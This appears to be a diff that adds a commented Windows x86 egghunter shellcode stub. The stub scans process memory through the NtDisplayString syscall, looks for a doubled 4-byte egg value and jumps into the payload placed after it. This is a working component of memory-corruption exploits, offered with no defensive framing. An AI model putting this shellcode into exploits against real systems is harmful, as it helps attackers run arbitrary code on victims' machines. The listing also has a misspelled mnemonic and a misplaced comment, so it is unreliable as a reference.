@@ -1,0 +1,16 @@
+6681CAFF0F	or dx,0xfff		; align page address
+42		inc edx		; goto next address
+52		push edx  		; push content of EDX register on the stack
+6A43		push byte +0x43  	; push 0x43 onto stack | syscall ID NtDisplayString
+58		pop eax  		; Restore EAX from stack
+CD2E		int 0x2e  		; user to kernel mode transitions
+3C05		cmp al,0x5		; compare low order byte of eax to 0x5 (indicates access violation)
+5A		pop edx ; 		; Restore EDX from stack
+74EF		jz 0x0		; Jump back to start dx
+B890509050	mov eax,0x50905090 ; put EGG into EAX
+8BFA		mov edi,edx  	; Compare EAX with what is at EDI
+AF		scasd 		; Compare EAX with what is at EDI
+75EA		jnz 0x5 		; jump to line 1 if the egg was not found
+AF		scads			; check if the egg exists again	
+75E7		jnz 0x5		; jump to line 1 if the second egg is not found.	
+FFE7		jmp edi		; jump to the found egg
